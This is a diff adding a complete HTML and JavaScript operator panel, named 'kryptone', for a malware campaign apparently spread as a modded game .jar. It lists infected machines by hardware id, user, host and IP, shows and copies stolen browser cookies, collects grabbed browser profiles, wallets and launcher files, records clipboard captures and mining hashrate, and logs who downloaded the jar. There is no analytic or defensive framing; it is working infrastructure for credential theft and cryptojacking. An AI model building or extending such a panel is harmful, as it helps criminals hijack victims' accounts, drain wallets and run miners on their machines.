@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>kryptone — panel</title>
+<style>
+  :root { --bg:#0b0f0d; --panel:#111815; --line:#22302a; --txt:#d7e3dc; --dim:#75897d;
+          --lime:#a3e635; --green:#4ade80; --red:#f87171; --amber:#fbbf24; --cyan:#22d3ee; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--txt);
+    font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
+  header { display:flex; align-items:center; gap:14px; padding:14px 20px;
+    border-bottom:1px solid var(--line); flex-wrap:wrap; position:sticky; top:0;
+    background:rgba(11,15,13,.92); backdrop-filter:blur(8px); z-index:5; }
+  h1 { font-size:14px; margin:0; letter-spacing:.24em; text-transform:uppercase; color:var(--lime); }
+  .spacer { flex:1; }
+  .chip { border:1px solid var(--line); border-radius:999px; padding:3px 9px; font-size:11px; color:var(--dim); }
+  .chip.live { color:var(--green); border-color:rgba(74,222,128,.4); }
+  nav { display:flex; gap:4px; padding:10px 20px 0; }
+  nav button { background:transparent; border:1px solid transparent; border-bottom:none;
+    color:var(--dim); padding:9px 14px; border-radius:9px 9px 0 0; cursor:pointer; font:inherit; letter-spacing:.08em; }
+  nav button.on { background:var(--panel); border-color:var(--line); color:var(--lime); }
+  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(135px,1fr)); gap:10px; padding:14px 20px; }
+  .stat { background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:11px 13px; }
+  .stat span { display:block; font-size:10px; letter-spacing:.12em; text-transform:uppercase; color:var(--dim); }
+  .stat b { font-size:21px; font-weight:600; }
+  main { padding:0 20px 60px; }
+  section { display:none; }
+  section.on { display:block; }
+  table { width:100%; border-collapse:collapse; margin-top:10px; }
+  th { text-align:left; font-size:10px; letter-spacing:.12em; text-transform:uppercase;
+    color:var(--dim); padding:8px; border-bottom:1px solid var(--line); white-space:nowrap; }
+  td { padding:9px 8px; border-bottom:1px solid #18211d; vertical-align:top; }
+  tr:hover td { background:#0f1512; }
+  .pill { padding:2px 7px; border-radius:999px; font-size:10px; font-weight:700; letter-spacing:.05em; }
+  .pill.mine { color:var(--green); background:rgba(74,222,128,.12); border:1px solid rgba(74,222,128,.35); }
+  .pill.foreign { color:var(--red); background:rgba(248,113,113,.12); border:1px solid rgba(248,113,113,.35); }
+  .pill.unknown { color:var(--amber); background:rgba(251,191,36,.1); border:1px solid rgba(251,191,36,.3); }
+  .dot { display:inline-block; width:7px; height:7px; border-radius:50%; margin-right:7px; background:#39463f; }
+  .dot.on { background:var(--green); box-shadow:0 0 8px var(--green); }
+  .dim { color:var(--dim); }
+  .link { color:var(--lime); text-decoration:none; cursor:pointer; }
+  .link:hover { text-decoration:underline; }
+  .btn { background:#16201b; border:1px solid var(--line); color:var(--txt); border-radius:8px;
+    padding:5px 9px; cursor:pointer; font:inherit; font-size:11px; }
+  .btn:hover { border-color:var(--lime); color:var(--lime); }
+  .toolline { display:flex; gap:10px; align-items:center; margin:14px 0 4px; flex-wrap:wrap; }
+  .toolline input { flex:1; min-width:180px; background:#0d1310; border:1px solid var(--line);
+    color:var(--txt); border-radius:8px; padding:8px 11px; font:inherit; }
+  .empty { color:var(--dim); text-align:center; padding:36px 10px; }
+  .trunc { max-width:340px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .cookieval { max-width:380px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#9db4a5; }
+  .modal { position:fixed; inset:0; background:rgba(3,6,5,.78); display:none;
+    place-items:center; padding:24px; z-index:20; }
+  .modal.on { display:grid; }
+  .sheet { width:min(1000px,96vw); max-height:88vh; overflow:auto; background:var(--panel);
+    border:1px solid var(--line); border-radius:14px; padding:18px 20px; }
+  .sheet h2 { margin:0 0 2px; font-size:14px; color:var(--lime); letter-spacing:.08em; }
+  .sheet .sub { color:var(--dim); font-size:11px; margin-bottom:12px; }
+  .sechead { display:flex; justify-content:space-between; align-items:center; gap:10px; flex-wrap:wrap; }
+  .tag { font-size:10px; color:var(--dim); border:1px solid var(--line); padding:1px 6px; border-radius:5px; }
+  code { color:#bfe6c9; }
+  .flash { animation:flash .7s ease; }
+  @keyframes flash { from { background:rgba(163,230,53,.13); } to { background:transparent; } }
+</style>
+</head>
+<body>
+<header>
+  <h1>kryptone</h1>
+  <span class="chip live" id="conn">live</span>
+  <span class="chip" id="own">wallet —</span>
+  <a class="chip" id="jarLink" href="#" style="display:none;text-decoration:none">jar</a>
+  <div class="spacer"></div>
+  <button class="btn" id="refresh">refresh</button>
+  <button class="btn" id="out">logout</button>
+</header>
+
+<div class="stats">
+  <div class="stat"><span>installs</span><b id="tRigs">0</b></div>
+  <div class="stat"><span>online</span><b id="tOnline">0</b></div>
+  <div class="stat"><span>cookies</span><b id="tCookies" style="color:var(--cyan)">0</b></div>
+  <div class="stat"><span>downloads</span><b id="tDl">0</b></div>
+  <div class="stat"><span>clips</span><b id="tClips">0</b></div>
+  <div class="stat"><span>hashrate</span><b id="tHash">0 H/s</b></div>
+</div>
+
+<nav>
+  <button class="on" data-tab="rigs">installs</button>
+  <button data-tab="cookies">cookies</button>
+  <button data-tab="downloads">downloads</button>
+  <button data-tab="files">files</button>
+</nav>
+
+<main>
+  <section class="on" id="tab-rigs">
+    <table>
+      <thead><tr><th>rig</th><th>owner</th><th>cookies</th><th>mods</th><th>ip</th><th>last seen</th><th></th></tr></thead>
+      <tbody id="rigRows"><tr><td colspan="7" class="empty">no installs yet</td></tr></tbody>
+    </table>
+  </section>
+
+  <section id="tab-cookies">
+    <div class="toolline">
+      <input id="ckFilter" placeholder="filter domain / name / value …" />
+      <span class="dim" id="ckCount"></span>
+    </div>
+    <table>
+      <thead><tr><th>rig</th><th>host</th><th>name</th><th>value</th><th>flags</th><th></th></tr></thead>
+      <tbody id="ckRows"><tr><td colspan="6" class="empty">nothing yet</td></tr></tbody>
+    </table>
+  </section>
+
+  <section id="tab-downloads">
+    <table>
+      <thead><tr><th>file</th><th>ip</th><th>user-agent</th><th>when</th></tr></thead>
+      <tbody id="dlRows"><tr><td colspan="4" class="empty">nobody pulled the jar yet</td></tr></tbody>
+    </table>
+  </section>
+
+  <section id="tab-files">
+    <div class="toolline"><span class="dim">grabs land here — browser profile zips, wallets, launcher files</span></div>
+    <table>
+      <thead><tr><th>rig</th><th>file</th><th>size</th><th>when</th></tr></thead>
+      <tbody id="grRows"><tr><td colspan="4" class="empty">no grabs yet</td></tr></tbody>
+    </table>
+  </section>
+</main>
+
+<div class="modal" id="ckModal">
+  <div class="sheet">
+    <div class="sechead">
+      <div><h2 id="ckTitle">cookies</h2><div class="sub" id="ckSub"></div></div>
+      <button class="btn" id="ckClose">close</button>
+    </div>
+    <input id="ckModalFilter" placeholder="filter…" style="width:100%;margin:8px 0 4px;background:#0d1310;border:1px solid var(--line);color:var(--txt);border-radius:8px;padding:8px 11px;font:inherit" />
+    <table>
+      <thead><tr><th>host</th><th>name</th><th>value</th><th>flags</th><th></th></tr></thead>
+      <tbody id="ckModalRows"></tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+const $ = (id) => document.getElementById(id);
+const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+let STATE = { rigs: [], downloads: [], dist: [], totals: {} };
+let CK = [];        // flat cookies for the cookies tab
+let CK_RIGS = new Map();
+let current = null; // hwid for modal
+
+function fmtHash(h) {
+  if (!h) return '0 H/s';
+  const u = ['H/s','kH/s','MH/s','GH/s']; let i = 0;
+  while (h >= 1000 && i < u.length - 1) { h /= 1000; i++; }
+  return h.toFixed(h < 10 ? 2 : 1) + ' ' + u[i];
+}
+function ago(ts) {
+  if (!ts) return '—';
+  const s = Math.floor((Date.now() - ts) / 1000);
+  if (s < 60) return s + 's';
+  if (s < 3600) return Math.floor(s / 60) + 'm';
+  if (s < 86400) return Math.floor(s / 3600) + 'h';
+  return Math.floor(s / 86400) + 'd';
+}
+function copy(text) {
+  navigator.clipboard.writeText(text).then(() => {});
+}
+
+async function api(path, opt = {}) {
+  const r = await fetch(path, { credentials: 'same-origin', ...opt });
+  if (r.status === 401) { location.href = '/login'; throw new Error('auth'); }
+  if (!r.ok) throw new Error(r.status);
+  return r.json();
+}
+
+async function load() {
+  try {
+    STATE = await api('/api/state');
+    $('conn').textContent = 'live';
+    $('conn').style.color = 'var(--green)';
+  } catch (e) {
+    $('conn').textContent = 'offline';
+    $('conn').style.color = 'var(--red)';
+    return;
+  }
+  render();
+}
+
+function render() {
+  const { rigs, downloads, dist, totals } = STATE;
+  const jar = (dist || []).find(f => f.endsWith('.jar'));
+  if (jar) {
+    $('jarLink').style.display = '';
+    $('jarLink').href = '/dl/' + encodeURIComponent(jar);
+    $('jarLink').textContent = jar;
+  }
+  $('tRigs').textContent = totals.rigs || 0;
+  $('tOnline').textContent = totals.online || 0;
+  $('tCookies').textContent = totals.cookies || 0;
+  $('tDl').textContent = totals.downloads || 0;
+  $('tClips').textContent = totals.clips || 0;
+  $('tHash').textContent = fmtHash(totals.hashrate || 0);
+
+  $('rigRows').innerHTML = rigs.length ? rigs.map(r => `
+    <tr>
+      <td><span class="dot ${r.online?'on':''}"></span>${esc(r.worker)}
+        <div class="dim">${esc(r.user)}@${esc(r.host)} · ${esc(r.os)}</div></td>
+      <td><span class="pill ${r.praise}">${r.praise.toUpperCase()}</span>
+        <div class="dim">${esc(r.wallet ? r.wallet.slice(0,10)+'…' : '—')}</div></td>
+      <td><span class="link" data-ck="${esc(r.hwid)}">${r.cookies}</span></td>
+      <td><div class="trunc" title="${esc(r.mods.slice(0,12).map(m=>m.id+'@'+m.version).join(', '))}">
+        ${r.mods.length} mods <span class="dim">·</span> <span class="tag">${esc(r.mods.find(m=>m.id==='kryptone')?.version || '—')}</span>
+      </div></td>
+      <td class="dim">${esc(r.ip || '—')}</td>
+      <td class="dim">${ago(r.lastSeen)}</td>
+      <td><button class="btn" data-ck="${esc(r.hwid)}">cookies</button></td>
+    </tr>`).join('') : '<tr><td colspan="7" class="empty">no installs yet</td></tr>';
+
+  document.querySelectorAll('[data-ck]').forEach(el => el.onclick = () => openCookies(el.dataset.ck));
+
+  // downloads
+  $('dlRows').innerHTML = downloads.length ? downloads.map(d => `
+    <tr><td>${esc(d.file)}</td><td class="dim">${esc(d.ip)}</td>
+    <td class="dim trunc" title="${esc(d.ua)}">${esc(d.ua)}</td>
+    <td class="dim">${ago(d.ts)}</td></tr>`).join('')
+    : '<tr><td colspan="4" class="empty">nobody pulled the jar yet</td></tr>';
+
+  // files
+  const files = [];
+  for (const r of rigs) for (const g of r.grabs) files.push({ hwid: r.hwid, worker: r.worker, ...g });
+  files.sort((a,b) => b.ts - a.ts);
+  $('grRows').innerHTML = files.length ? files.map(f => `
+    <tr><td>${esc(f.worker)}</td>
+    <td><a class="link" href="/api/grab/${encodeURIComponent(f.hwid)}/${encodeURIComponent(f.file)}">${esc(f.file)}</a></td>
+    <td class="dim">${(f.bytes/1024).toFixed(0)} KB · ${f.files} files</td>
+    <td class="dim">${ago(f.ts)}</td></tr>`).join('')
+    : '<tr><td colspan="4" class="empty">no grabs yet</td></tr>';
+
+  // cookie tab (flat)
+  CK = [];
+  CK_RIGS.clear();
+  for (const r of rigs) {
+    CK_RIGS.set(r.hwid, r.worker);
+    if (!r.cookies) continue;
+    // header rows only — detail fetched on demand
+    CK.push({ hwid: r.hwid, rig: r.worker, host: '—', name: `${r.cookies} stored`, value: '', flags: '', summary: true });
+  }
+  renderFlatCookies();
+}
+
+let flatTimer = null;
+function renderFlatCookies() {
+  const q = ($('ckFilter').value || '').toLowerCase();
+  const rows = CK.filter(c => !c.summary).filter(c =>
+    !q || [c.host, c.name, c.value].join(' ').toLowerCase().includes(q));
+  $('ckCount').textContent = rows.length + ' shown · open a rig for full list';
+  $('ckRows').innerHTML = rows.length ? rows.slice(0, 500).map(c => `
+    <tr><td class="dim">${esc(c.rig)}</td><td>${esc(c.host)}</td><td>${esc(c.name)}</td>
+    <td class="cookieval" title="${esc(c.value)}">${esc(c.value)}</td>
+    <td class="dim">${c.flags}</td>
+    <td><button class="btn" data-copy="${esc(c.value)}">copy</button></td></tr>`).join('')
+    : '<tr><td colspan="6" class="empty">open a rig → cookies to load them</td></tr>';
+  document.querySelectorAll('[data-copy]').forEach(b => b.onclick = () => copy(b.dataset.copy));
+}
+
+async function openCookies(hwid) {
+  const data = await api('/api/cookies/' + encodeURIComponent(hwid));
+  current = { hwid, items: data.items || [] };
+  $('ckTitle').textContent = 'cookies — ' + (CK_RIGS.get(hwid) || hwid);
+  $('ckSub').textContent = `${current.items.length} cookies · updated ${ago(data.updated)} ago`;
+  $('ckModalFilter').value = '';
+  renderModal();
+  $('ckModal').classList.add('on');
+}
+function renderModal() {
+  const q = ($('ckModalFilter').value || '').toLowerCase();
+  const items = current.items.filter(c => !q || [c.host, c.name, c.value].join(' ').toLowerCase().includes(q));
+  $('ckModalRows').innerHTML = items.length ? items.map(c => `
+    <tr><td>${esc(c.host)}</td><td>${esc(c.name)}</td>
+    <td class="cookieval" title="${esc(c.value)}">${esc(c.value)}</td>
+    <td class="dim">${c.httpOnly ? 'H' : ''}${c.secure ? 'S' : ''} <span class="tag">${esc(c.profile || '')}</span></td>
+    <td><button class="btn" data-copy="${esc(c.value)}">copy</button></td></tr>`).join('')
+    : '<tr><td colspan="5" class="empty">no match</td></tr>';
+  document.querySelectorAll('[data-copy]').forEach(b => b.onclick = () => copy(b.dataset.copy));
+}
+
+// tabs
+document.querySelectorAll('nav button').forEach(b => b.onclick = () => {
+  document.querySelectorAll('nav button').forEach(x => x.classList.remove('on'));
+  document.querySelectorAll('section').forEach(x => x.classList.remove('on'));
+  b.classList.add('on');
+  $('tab-' + b.dataset.tab).classList.add('on');
+});
+
+$('refresh').onclick = load;
+$('out').onclick = async () => { await fetch('/logout', { method:'POST' }); location.href = '/login'; };
+$('ckFilter').oninput = () => { clearTimeout(flatTimer); flatTimer = setTimeout(renderFlatCookies, 120); };
+$('ckModalFilter').oninput = () => { clearTimeout(flatTimer); flatTimer = setTimeout(renderModal, 120); };
+$('ckClose').onclick = () => $('ckModal').classList.remove('on');
+$('ckModal').onclick = (e) => { if (e.target === $('ckModal')) $('ckModal').classList.remove('on'); };
+
+load();
+setInterval(load, 4000);
+</script>
+</body>
+</html>
